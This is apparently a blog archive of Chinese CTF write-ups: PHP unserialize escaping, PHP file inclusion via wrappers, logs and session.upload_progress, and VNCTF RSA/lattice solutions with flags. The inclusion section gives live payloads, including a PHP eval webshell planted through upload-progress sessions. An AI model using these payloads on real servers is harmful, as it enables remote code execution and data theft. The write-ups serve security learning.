就会变成a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kiritoo&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;, 这里就会出现一个错误s:6:&quot;kiritoo&quot;, 长度应该为6的字符变成7了 逃逸逃逸, 目的就是逃出双引号, 如果我们的数组是 1234array( &quot;name&quot; =&gt; &#x27;kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&#x27;, &quot;level&quot; =&gt; &#x27;18&#x27;) 序列化之后就是a:2:&#123;s:4:&quot;name&quot;;s:55:&quot;kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125; 这里name里面本身就有双引号, 但是不能实现逃逸, 是因为反序列化时候, 会读取指定长度的字符后下一个字符是否是&quot;就比如这里的s:55:&quot;kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&quot;,读取55个字符kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;后, 就剩下结尾的&quot;, 所以中间的&quot;并不影响反序列化 但如果将序列化之后的字符串进行替换操作, 将会变成s:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;, 现在再来看看读取55个字符后是啥, 我们发现kiritoooooooooooooooooooooooooooooooooooooooooooooooooo刚好就是55个字符, 而后面刚好就是一个&quot;, 这意味着在反序列化的时候, 后面的;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;则会逃逸出去, 被识别成序列化字符串的另一部分.(具体原因就是因为多出的o的长度刚好就是&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;)的长度 最后, 我们来看看总的字符串处理完是怎样的 1a:2:&#123;s:4:&quot;name&quot;;s:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125; 反序列化有个特点, 当判断反序列化结束后, 后面的字符将会自动忽略, 那么这里反序列化就会只处理a:2:&#123;s:4:&quot;name&quot;;s:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;后面的&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;会被自动忽略, 这样我们就成功通过控制name, 逃逸并修改了level 将处理后的字符串反序列化的结果: 123array(2) &#123; [&quot;name&quot;]&#x3D;&gt; string(55) &quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot; [&quot;level&quot;]&#x3D;&gt; string(3) &quot;999&quot; &#125; 参考文章 y4爷爷的反序列化总结: https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161638163316780357284910%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161638163316780357284910&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-14-113588692.pc_v1_rank_blog_v1&amp;utm_term=show CRLF总结: https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html","tags":[{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"Unserialize","slug":"Unserialize","permalink":"http://tearsjin.github.io/tags/Unserialize/"}]},{"title":"The learning of php 文件包含","date":"2021-03-21T06:26:07.000Z","path":"2021/03/21/The-learning-of-php-文件包含/","text":"文件包含概述文件包含顾名思义, 通过某些函数来引入一些文件但传入的文件名没有经过合理的验证, 从而操作了预想之外的文件, 就可能导致意外的文件泄漏甚至恶意代码注入。 常见的文件包含函数 include() require() include_once() require_once() highlight_file() show_source() readfile() file_get_contents() fopen() file() PHP伪协议通常情况下有文件包含函数还不够, 需要搭配伪协议才能干更多的事情 协议 PHP版本 alow_url_fopen allow_url_include 用法示例 file:// &gt;=5.2 off/on off/on file://D:/soft/phpStudy/WWW/flag.txt php://filter &gt;=5.2 off/on off/on php://filter/read=convert.base64-encode/resource=./index.php php://input &gt;=5.2 off/on on php://input [post data]: &lt;?php phpinfo() ?&gt; zip:// &gt;=5.2 off/on off/on zip://D:/soft/phpStudy/WWW/file.zip%23flag.txt compress.bzip2:// &gt;=5.2 off/on off/on compress.bzip2://D:/soft/phpStudy/WWW/file.bz2compress.bzip2://./file.bz2 compress.zlib:// &gt;=5.2 off/on off/on 同上 data:// &gt;=5.2 on on data://text/plain,&lt;?php phpinfo()?&gt;data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= 包含日志文件Web服务器一般会将用户的访问记录保存在日志文件当中. 如果存在文件包含的函数, 而且知道日志文件的路径, 可以构造请求把PHP代码写进日志文件中并引入执行 寻找日志文件日志文件的目录一般会被修改, 可以寻找httpd.conf,nginx,conf或者根据phpinfo()中的信息来得知日志文件目录 Apache: Windows: &lt;Apache安装目录&gt;\\logs\\access.log | error.log Linux: /usr/local/apache/logs/access_log | error_log Nginx: /var/log/nginx 包含session.upload_progress PHP版本: 5.4+ 在php5.4以上添加了一个新的功能 session.upload_progress, 这个功能在客户端上传文件的时候会创建一个session文件, 默认路径应该是/tmp/tmp, 这个文件里存储的上传文件的进度. 不过, 要利用这个session.upload_progress, 还要依靠另外一个php.ini的默认选项session.use_strict_mode = 0, 当这个值为0的时候, 用户是可以自己定义Session ID的, 比如在Cookies中设置PHPSESSID = k1rit0, php将在服务器上创建一个tmp/tmp/sess_k1rit0, 并且自动初始化, 也就是会在里面写入 1session.upload_progress.prefix + session.upload_progress.name session.upload_progress.prefix是服务端设置的, 默认为upload_progress_session.upload_progress.name是用户POST的data: PHP_SESSION_UPLOAD_PROGRESS, 比如POST PHP_SESSION_UPLOAD_PROGRESS= &lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;那么用户在上传文件的时候, 就会生成这么一个session文件 1upload_progress_&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt; | // 后面是上传进度 很显然这个文件如果被文件包含函数包含, 则可以执行一系列的命令但是这个session文件将在文件上传完成之后自动删除.这里就需要利用条件竞争了, 不停的上传同样的文件, 使得session一直存在.","tags":[{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"文件包含","slug":"文件包含","permalink":"http://tearsjin.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"writeup for 2021VNCTF Crypto","date":"2021-03-14T11:51:27.000Z","path":"2021/03/14/writeup-for-2021VNCTF/","text":"这次比赛听说是签到难度, 就做了一下, 结果也没能ak (说简单都是骗人的…)嗯… 会做的题也没什么收获, 硬要说的话, whitegive的第一层需要通过运算把已知的条件合在一起或者消去一些不可能求出的参数, 这个一直都是密码分析的基础吧, 来看看题吧 0x00 wihtegiveproblem123456789101112131415161718192021222324252627282930313233343536from Crypto.Util.number import *from secret import urlfrom gmpy2 import *m = bytes_to_long(url)p = getPrime(512)q = getPrime(512)n = p * qd = getPrime(256)e = inverse(d,(p-1)*(q-1))c = pow(m,e,n)print(n)print(c)m = ep = getPrime(512)q = getPrime(512)n = p * p * qe = 0x10001d = inverse(e,lcm(p,lcm(p-1,q-1)))c = pow(m,e,n)hint = pow(d,e,n)print(n)print(c)print(hint)&#x27;&#x27;&#x27;97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441861433117883636756846741136991930467817966389132430161525555721508581595005276740637546945145019997918755611429251549910005326287991856084650628145461081604344680988980407690210720073741565463149752405833474680260016336529404087791555793394709605710676529248146233711779010523020052891553050895882042043132611246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684&#x27;&#x27;&#x27; 1234567891011121314151617181920212223242526# Wow, you got here!# This is the last task, trust me!from Crypto.Util.number import *from secret import flag,paddingfrom gmpy2 import *m = bytes_to_long(flag)e = 7 p = getPrime(512)q = getPrime(512)n = p * qc1 = pow(m,e,n)c2 = pow(m+padding,e,n)print(n)print(c1)print(c2)&#x27;&#x27;&#x27;143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511747971736575756405981407884108520168436125195883759681905797344209513741031295706378225472179679789113284198085292041435224541423031389590132208115584909516143143068493670684781907978850569227054030288567340952885222900553098805723215574937983620562167837775933861333476938929419281319459860877127378622637619209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214&#x27;&#x27;&#x27; 好家伙, 连Crypto都开始套娃了, 一共三层RSA, 做了前两层才能知道第三层 第一层 利用gcd()分解n e : 65537 c: 密文 hint: $hint = d^e (mod \\ n)$ 这题不算难, 仔细算一下就能知道这个hint有什么用了首先看一下d = inverse(e,lcm(p,lcm(p-1,q-1))), $p$都已经是素数了, 公倍数肯定是$kp$ 那么我们就有$$e \\cdot d = 1 (mod \\ kp)$$把hint的式子和这个式子都改写成:$$e \\cdot d = 1 + k_1p \\\\d^e = hint + k_2n$$联立一下就有:$$({k_1p+1 \\over e})^e = hint + k_2n \\Rightarrow (k_1p+1) = e^e(hint + k_2n) \\\\\\Rightarrow (k_1-e^ek_2q)p = e^e \\cdot hint - 1$$取个gcd(e**e * hint - 1,n), 就可以有p了, 分解n就好做了, 这一层还是挺有意思的 第二层 Boneh_Durfee attack这一层的私钥$d \\approx 2^{256}$, 而$n \\approx 2^{1024}$, 满足使用Boneh_Durfee attack的条件, 直接扔到脚本里跑就能跑出$d$来了有了$d$直接解密即可 第三层 Coppersmith’s Short-pad Attack第二层出来一个网站https://dawn-whisper.lanzous.com/iCAv0lod7yj-password:gzjq&#39;, 以及密码 打开后还是一道RSA 如题, e够小, 直接上脚本就行 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from gmpy2 import *from Crypto.Util.number import long_to_bytes# 第一层e = 65537h = 788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684n = 1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959c = 952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747ee = pow(e, e)p = gcd(ee * h - 1, n)q = n // p ** 2phi = (p - 1) * p * (q - 1)d = invert(e,phi)e = pow(c, d, n)print(e)# 第二层# Boneh_Durfee attack出的结果# 脚本在https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.saged = 103079922798932082066165266087442072203677117380612800709240732626110126828541n = 97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441assert pow(pow(3,e,n),d,n) == 3c = 86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261print(long_to_bytes(pow(c,d,n)))# 第三层def short_pad_attack(c1, c2, e, n): PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.4)[0] return diffdef related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]n = 143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511e = 7c1 = 74797173657575640598140788410852016843612519588375968190579734420951374103129570637822547217967978911328419808529204143522454142303138959013220811558490951614314306849367068478190797885056922705403028856734095288522290055309880572321557493798362056216783777593386133347693892941928131945986087712737862263761c2 = 9209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214diff = short_pad_attack(c1, c2, e, n)m1 = related_message_attack(c1, c2, diff, e, n)long_to_bytes(m1) # VNCTF&#123;H4ppyNeWy34r!2021_V&amp;N_figHt1ng!&#125; 0x01 strange functionproblem1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from Crypto.Util.number import *from hashlib import sha256from secret import flagimport socketserverimport signalimport stringimport randomimport osMENU = br&#x27;&#x27;&#x27;[+] 1.function[+] 2.check_answer[+] 3.exit&#x27;&#x27;&#x27;class Task(socketserver.BaseRequestHandler): # 为了缩短篇幅, 这部分没有特别意义的函数就省略了 def proof_of_work(self): random.seed(os.urandom(8)) proof = &#x27;&#x27;.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) _hexdigest = sha256(proof.encode()).hexdigest() self.send(f&quot;[+] sha256(XXXX+&#123;proof[4:]&#125;) == &#123;_hexdigest&#125;&quot;.encode()) x = self.recv(prompt=b&#x27;[+] Plz tell me XXXX: &#x27;) if len(x) != 4 or sha256(x+proof[4:].encode()).hexdigest() != _hexdigest: return False return True def function(self, x): res = 0 for i in range(self.lenth): numerator = ord(self.token[i]) denominator = x - self.data[i] try: tmp = numerator / denominator except Exception as e: self.send(b&#x27;[+] Error!&#x27;) return res += tmp return res def handle(self): signal.alarm(1000) if not self.proof_of_work(): return self.send(b&#x27;[+] Welcome!&#x27;) self.send(b&#x27;[+] Can you find the flag through the calculating?&#x27;) self.score = 0 self.token = &#x27;&#x27;.join(random.sample(string.ascii_letters + string.digits, 16)) self.lenth = len(self.token) self.data = [] for i in range(self.lenth): self.data.append(getRandomInteger(32)) self.send(str(self.data).encode()) while True: self.send(MENU, newline=False) choice = self.recv() if(choice == b&#x27;1&#x27;): self.send(b&quot;[+] Plz give me your x: &quot;) now = int(self.recv().strip().decode()) now = self.function(now) self.send((&quot;[+] let me show you the answer: &quot;+str(now)).encode()) elif(choice == b&#x27;2&#x27;): guess = self.recv().strip().decode() if(guess == self.token): self.score += 1 self.send(b&quot;[+] You win!&quot;) self.send((&quot;[!] Now your score: &quot; + str(self.score)).encode()) self.token = &#x27;&#x27;.join([random.choice(string.digits + string.ascii_letters) for i in range((self.score+1)*16)]) self.lenth = len(self.token) self.data = [] for i in range(self.lenth): self.data.append(getRandomInteger(32)) self.send(str(self.data).encode()) if(self.score &gt;= 5): self.send(flag.encode()) else: self.send(b&#x27;[+] What do you want to say???&#x27;) self.send(b&#x27;[!] Go away!&#x27;) break else: break self.request.close()if __name__ == &quot;__main__&quot;: HOST, PORT = &#x27;0.0.0.0&#x27;, 10002 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 分析先理一理这题在干嘛, 要我们干嘛前面常规的工作量证明就不说了 每次访问服务端的时候, 会从abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789挑出16位作为token 然后将token中的每一位的ascii码都乘一个不同的随机的数(范围在$(0,2^{32})$), 作为data然后发给客户端客户端可以输入一个数$x$让服务端计算:$$token =[t_0,t_1,\\cdots,t_n] \\\\data = [d_0,d_1,\\cdots,d_n] \\\\A = {t_0 \\over x - d_0} + {t_1 \\over x - d_1} + \\cdots + {t_n \\over x - d_n}$$ 并返回给客户端 解题的目标就是通过服务端返回的$A$,(可以重复输入不同的$x$获得不同的$A$猜出五轮的$token$(每一轮$token$的位数都会增加 因为这里的$d_i$范围比较大, 所以每一个$d$都相差比较远, 当$x = d_i + 1$的时候,${t_i \\over x - d_i} = t_i$ $|x - d_j| = |d_i + 1 - d_j|(j \\ne i)$ 会特别大所以事实上每次输入$x = d_i + 1$的时候, 有$$A_i = {t_0 \\over d_i+1-d_0 } + {t_1 \\over d_i+1 - d_1} + \\cdots + {t_n \\over d_i+1 - d_n} \\approx {t_i}$$把每次的$A_i$四舍五入之后就是$t_i$了所以每一轮把$x_0,x_1,\\cdots,x_n$都发送一次, 就能得到$t_0,t_1,\\cdots,t_n$了 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *from hashlib import sha256import reprintable = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256((start+END).encode()).hexdigest() if ensha == SHA: print(start) return startcon = remote(&#x27;node3.buuoj.cn&#x27;,29406)resp = con.recvuntil(&#x27;: &#x27;).decode()END = re.findall(&#x27;XXXX\\+(.*)\\)&#x27;,resp)[0]SHA = re.findall(&#x27;== (.*)&#x27;,resp)[0]con.send(proof(END,SHA).encode())resp = con.recvuntil(&#x27;[-] &#x27;).decode()for _ in range(5): token = [] array = re.findall(r&#x27;\\d+&#x27;, resp) data = [] for i in array: if len(i) &gt; 1: data.append(int(i)) for i in data: con.sendline(&#x27;1&#x27;) resp = con.recvuntil(&#x27;[-] &#x27;).decode() con.sendline(str(i + 1)) resp = con.recvuntil(&#x27;[-] &#x27;).decode() token.append(round(float(re.findall(r&#x27;let me show you the answer: (.*)&#x27;, resp)[0]))) print(token) presend = &#x27;&#x27; for i in token: presend += chr(i) con.sendline(&#x27;2&#x27;) resp = con.recvuntil(&#x27;[-] &#x27;).decode() con.sendline(presend) resp = con.recvuntil(&#x27;[-] &#x27;).decode() print(resp)# flag&#123;66a00c10-773f-4375-8a8e-444f0337bd31&#125; 0x02 strange_function_revengeproblem跟上一题的区别不大, 就不贴上来了 分析跟第一题的区别就在于随机数的大小变小了, 这样会导致每个$d$的差距不会太大, 再发送$x_i = d_i + 1$, 返回的$A_i$四舍五入就不一定是$t_i$了, 这里的解决办法就是对返回的$A_i$进行一次修正后再四舍五入 因为$token$是从abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789取的, 这些字符的ascii都是连在一起的, 平均数是86, 每次发送$x_i$的时候, 把除了$t_i$的其他$t$都当作86, 这样就可以计算出:$$offset_i = {86 \\over d_i + 1 - d_0}+{86 \\over d_i + 1 - d_1}+\\cdots+{86 \\over d_i + 1 - d_j} (i \\ne j)$$这样就可以有!$$A_i - offset_i \\approx t_i$$跟strange_function一样发送数据就行了不过这个方法不太稳定, $offset$并不能保证每次都准确的修正$A$, 放一首好运来多跑几次吧(大概跑了七八次吧…. exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *from hashlib import sha256import reprintable = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;A = 86def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256((start+END).encode()).hexdigest() if ensha == SHA: print(start) return startcon = remote(&#x27;node3.buuoj.cn&#x27;,27609)resp = con.recvuntil(&#x27;: &#x27;).decode()END = re.findall(&#x27;XXXX\\+(.*)\\)&#x27;,resp)[0]SHA = re.findall(&#x27;== (.*)&#x27;,resp)[0]con.send(proof(END,SHA).encode())resp = con.recvuntil(&#x27;[-] &#x27;).decode()for _ in range(5): token = [] data = [] offset = [] array = re.findall(r&#x27;\\d+&#x27;, resp) for i in array: if len(i) &gt; 1: data.append(int(i)) for i in data: psend = i + 1 sum = 0 for j in data: if i != j: sum += A / (psend - j) offset.append(sum) for i in data: con.sendline(&#x27;1&#x27;) resp = con.recvuntil(&#x27;[-] &#x27;).decode() con.sendline(str(i + 1)) resp = con.recvuntil(&#x27;[-] &#x27;).decode() token.append(round(float(re.findall(r&#x27;let me show you the answer: (.*)&#x27;, resp)[0])-offset[data.index(i)])) print(token) presend = &#x27;&#x27; for i in token: presend += chr(i) con.sendline(&#x27;2&#x27;) resp = con.recvuntil(&#x27;[-] &#x27;).decode() con.sendline(presend) resp = con.recvuntil(&#x27;[-] &#x27;).decode() print(resp)# flag&#123;dfd7a22a-0ac7-4b7a-9dad-9d321fa2fcfa&#125; 0x03 fatcor 对着某个paper写了一下午的algorithm, 没做出来, tcltcltcl….. 等wp出来再总结一下 结果一个师傅教我了hh problem1234567891011121314151617181920212223242526272829303132from Crypto.Util.number import *from gmpy2 import *from secret import flagdef get_public_key(d): while 1: p, q = getPrime(512), getPrime(512) N, phi, not_phi = p * q, (p - 1) * (q - 1), (p + 1) * (q + 1) try: e = inverse(d, not_phi) assert gcd(e, phi) == 1 break except: pass return (N, e)def encrypt(pubkey, m): N, e = pubkey c = pow(m, e, N) return cm = bytes_to_long(flag)d = getPrime(300)pubkeys = [get_public_key(d), get_public_key(d)]cs = encrypt(pubkeys[0], m), encrypt(pubkeys[1], m)print(pubkeys)print(cs)&#x27;&#x27;&#x27;[(115483338707853323510117244601663937653032657454816581880428779391136584508645415322441921678179684904267659942318581245589538093236558206867210468172871004098796706517288570963560499418427771831765342801956281881820593084352360716457591198748797415842971188690055630073433785996545367137242661591939632740177, 57942961120648999071495995119939754708884253716257622598699627649519120883383654560602196191747110519111036450217116739928381611061803307053632035548944075112790103258912149703053932492832060534126356062378027983000713091223894604748395826345780826674822582205573649323340945351657354960324397873669889767611), (53622548101803784449246949981043962044702821559359430270342163843702543781580388956841660273746825211912789196955019345268896290156568895362182295889379787233440464948232717888315385094207004043907898658611926470834448875571292174245716821120409044389816082878077188546182422805778560826667364235348059795229, 37629174280947918845570975617525141920002123382327456934545962737176558640617579710289304146119507880547361939594011152968663070025066085778798378563965349218834887746411017240322083056673687330052590220772859205859051875687741541958997904176801239206348298021023694604932588913541173039972303193792987583003)](51861394323132582263685584977796608641129485967610029542263453128833142621927008505594685713111162217651119546991411861320042282788909858323941435593508384080858965324662410947546608051702238057613339996124961723578887443100478753831786550701578678090466528863014222331341645240511640398819027209200809466160, 53200507591144017820710284362261363695745231005527161900426580605551005076410241969689161754211964469126847594337121140420040532547631617290907291418063708630323838133357597795892690304405706577096504918510233628396424543417886828387510407109281423448827267022542075484645277275676556239547911837897827866040)&#x27;&#x27;&#x27; 分析抄了那么久的paper居然是用格子做的! 感谢d33b4t0师傅指点才弄出这题 这题给出了一个300-bit的$d$, 再根据这个$d$生成了两套公钥$n_1,n_2,e_1,e_2$ 关系式为$$e_1 \\cdot d = 1 + k_1(p_1+1)(q_1+1) \\\\e_2 \\cdot d = 1 + k_2(p_2+1)(q_2+1)$$记$p_1+q_1+1 = s_1, p_2+q_2+1 = s_2$, 把式子化一下就有$$e_1 \\cdot d - k_1n_1 = k_1s_1+1 \\\\e_2 \\cdot d - k_2n_2 = k_2s_2+1$$自己做的时候只用的其中的一个式子造二维格子, 结果死活都规约不出来(也不知道为啥, 以后能造三维就试试造三维吧. 用这两个式子造出一个三维格子$$(d ,-k_1,-k_2) =\\begin{pmatrix}\\sqrt n_1&amp;e_1&amp;e_2 \\\\0&amp;n_1&amp;0 \\\\0&amp;0&amp;n_2\\end{pmatrix}=(d\\sqrt n_1,k_1s_1+1,k_2s_2+1)$$(至于为啥有个$\\sqrt n_1$, 当然是为了调整一下范数! 向量的长度也是合适的(得靠$d, k ,s$的位数来判断 通过规约这个格子, 有了$(d\\sqrt n_1,k_1s_1+1,k_2s_2+1)$, 就能得出$d$ 剩下的就是已知$e,d,n$求$phi$了, 不过这里的$d$有点不太一样注意一下就ok了 exp12345678910111213141516171819202122from Crypto.Util.number import long_to_bytes as l2b ,isPrimen1 = 115483338707853323510117244601663937653032657454816581880428779391136584508645415322441921678179684904267659942318581245589538093236558206867210468172871004098796706517288570963560499418427771831765342801956281881820593084352360716457591198748797415842971188690055630073433785996545367137242661591939632740177n2 = 53622548101803784449246949981043962044702821559359430270342163843702543781580388956841660273746825211912789196955019345268896290156568895362182295889379787233440464948232717888315385094207004043907898658611926470834448875571292174245716821120409044389816082878077188546182422805778560826667364235348059795229e1 = 57942961120648999071495995119939754708884253716257622598699627649519120883383654560602196191747110519111036450217116739928381611061803307053632035548944075112790103258912149703053932492832060534126356062378027983000713091223894604748395826345780826674822582205573649323340945351657354960324397873669889767611e2 = 37629174280947918845570975617525141920002123382327456934545962737176558640617579710289304146119507880547361939594011152968663070025066085778798378563965349218834887746411017240322083056673687330052590220772859205859051875687741541958997904176801239206348298021023694604932588913541173039972303193792987583003half_n = round(sqrt(n))L = Matrix([[half_n ,e1 ,e2], [0 ,n1 ,0], [0 ,0 ,n2]])res = L.LLL()[0]assert abs(res[0]) % half_n == 0d = abs(res[0]) // half_nif isPrime(d) : knophi = e1 *d - 1 nophi = knophi // (knophi // n1 ) pq = nophi - n - 1 phi = n -pq +1 d1 = inverse_mod(e1,phi) print(l2b(pow(cs[0],d1,n1)))# b&#x27;vnctf&#123;7d47956b-bc55-4897-a550-cda0b221ce67&#125;&#x27; 后记这题做完感觉收获还是有的, 不像前面的几题 Lattice是一个神奇的东西, 一定要把所有方程写出来, 该联立的联立, 根据未知量和已知量以及这些数的位数,造出合适的Lattice才能求出出题人想要我们规约出的那个最短向量来","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"WirteUp","slug":"WirteUp","permalink":"http://tearsjin.github.io/tags/WirteUp/"}]},{"title":"2020纵横杯 comon-Extending Wiener attack","date":"2021-03-12T11:33:50.000Z","path":"2021/03/12/2020纵横杯-comon-Extending-Wiener-attack/","text":"problem1234567891011121314151617from Crypto.Util.number import *e1 = 28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581e2 = 131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563N = 159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253flag = b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;f1 = bytes_to_long(flag[:21])f2 = bytes_to_long(flag[21:])c1 = pow(f1, e1, N)c2 = pow(f2, e2, N)print(&quot;e1 = &quot;, e1)print(&quot;e2 = &quot;, e2)print(&quot;N = &quot;, N)print(&quot;c1 = &quot;, c1)print(&quot;c2 = &quot;, c2) 分析这个题一看还以为是简单的Common Attack, 只有同一个明文, 不同的$e$才能用Common Attack 这里显然两个密文对应的不是同一个明文…这种题估计都有什么攻击方法, 后来找wp看了, 果然是有一种攻击方法的, 把paper(Extending Wiener’s Attack in the Presence of Many Decrypting Exponents)详细的学了一遍, 才明白具体该怎么解, 这个攻击方法适用于$e$特别大, 并且有多个$e$的时候(显然$e$还有大到可以直接winner)大概思路是造一个格子求出参数让问题转变成winner要解决的问题(连分数的分解), 但是这里$g$是为1的所以不需要连分数可以直接求出phi 构造格子的方法paper里有, 阅读笔记里也有这里就不多说, 直接造!$$L_2 =\\begin{pmatrix}N&amp;-M_1N&amp;0&amp;N^2 